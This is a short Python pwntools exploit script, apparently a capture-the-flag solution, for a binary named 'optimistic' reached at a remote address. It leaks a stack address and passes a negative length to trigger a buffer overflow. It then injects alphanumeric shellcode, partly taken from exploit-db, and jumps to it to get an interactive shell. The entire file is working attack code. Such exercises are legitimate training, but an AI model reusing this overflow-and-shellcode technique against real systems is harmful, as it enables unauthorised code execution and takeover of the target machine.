from pwn import *

#b *main+367
#b *main+482
gs = '''
b *main+482
continue
'''

elf = context.binary = ELF("./optimistic")
context.arch = "amd64"

def start():
    if args.REMOTE:
        return remote("83.136.254.91", 53303)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.sendafter(": ", b"yB")

io.recvuntil(b"Great! Here's a small welcome gift: ")

stack_address = int(io.recvline().strip().decode(), 16)

print("[+] Stack Address:", hex(stack_address))

# Lo saque de aqui: https://www.exploit-db.com/exploits/35205
io.sendafter("Email: ", b"XXj0TYX45Pk13VX4".rjust(16, b"\x90"))
#io.sendafter("Age: ", b"BBBBBBBB")
io.sendlineafter("name: ", b"-200")
#input("PAUSE")


shellcode = b"0473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"
payload = b"".join([
    #b"A"*104,
    #shellcode.ljust(104, b"c"),
    shellcode.ljust(104, b"D"),
    #b"B"*8
    #p64(stack_address - 0x70)
    p64(stack_address - 0x70)
])
#print(payload)
io.sendlineafter("Name: ", payload)

io.interactive()
